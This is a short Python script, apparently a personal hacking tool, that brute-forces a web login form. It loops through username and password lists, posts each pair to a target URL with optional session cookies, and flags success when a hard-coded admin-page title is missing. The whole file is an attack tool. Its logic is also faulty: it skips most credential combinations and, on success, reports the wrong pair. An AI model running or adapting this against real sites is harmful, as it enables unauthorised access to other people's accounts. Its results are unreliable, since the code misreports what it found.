#!/usr/bin/env python3
#web-brute.py : @jockemedlinux 2023-04-09     Not universal  		   #
#Version v1.0: Bruteforcing web login form easily with cookies support #
########################################################################
import requests,argparse,sys
def login(url, username, password, cookies):
	response = requests.post(url, data={
		args.f1: username, #Make sure the casing is correct!
		args.f2: password, #Make sure the casing is correct!
	},
		verify=False,
		headers=cookies,
	)
	if not "Admin Information Systems Login" in response.text:
		return True
	else:
		return False

cookies = {"Cookie":'PHPSESSID="3hi7jv9n8uanun6ejbfsefbbq3"'}

if __name__ == "__main__":
	parser = argparse.ArgumentParser("bruteforcer.py")
	parser.add_argument("-H", type=str, help="The URL", required=True)
	parser.add_argument("-U", type=str, help="Usernames file", required=True)
	parser.add_argument("-P", type=str, help="Passwords file", required=True)
	parser.add_argument("-s", type=str, help="Error response from page. ('Username incorrect')", required=False)
	parser.add_argument("-C", type=str, help="Cookies data (The value only)", required=False)
	parser.add_argument("-f1", type=str, help="form data #1 (Username)", required=True)
	parser.add_argument("-f2", type=str, help="form data #2 (Password)", required=True)
	parser.add_argument("-f3", type=str, help="form data #3 (Submit)", required=False, default="")

	args = parser.parse_args()

	url = args.H
	cookies = {"Cookie":args.C} if args.C else None
	print("-" * 100)
	print("\nAttacking: %s\n" % (url))
	print("-" * 100)

	creds = []
	try:
		with open(args.U, "r") as userfile:
			usernames = [line.strip() for line in userfile.read().split("\n") if line]
		with open(args.P, "r") as passfile:
			passwords = [line.strip() for line in passfile.read().split("\n") if line]
		last_username = None
		last_password = None
		counter = 1
		while counter <= len(usernames) * len(passwords):
			username = usernames[(counter - 1) % len(usernames)]
			password = passwords[(counter - 1) % len(passwords)]
			logins = login(url, username, password, cookies)
			if not logins:
				print("Tried {:<30} | so far we've done {:>3} attempts".format(f"{username}:{password}", counter))
				counter += 1
				last_username = username
				last_password = password
				continue
			else:
				if last_username is not None and last_password is not None:
					print(f"\033[91m## SUCCESS ##\n\033[0m")
				print(f"\033[91m## Login Found ## \n {last_username}:{last_password}\033[0m")
				creds.append(last_username + ":" + last_password)
				break
	except KeyboardInterrupt:
		print("\nExiting..")
	except Exception as e:
		print(e)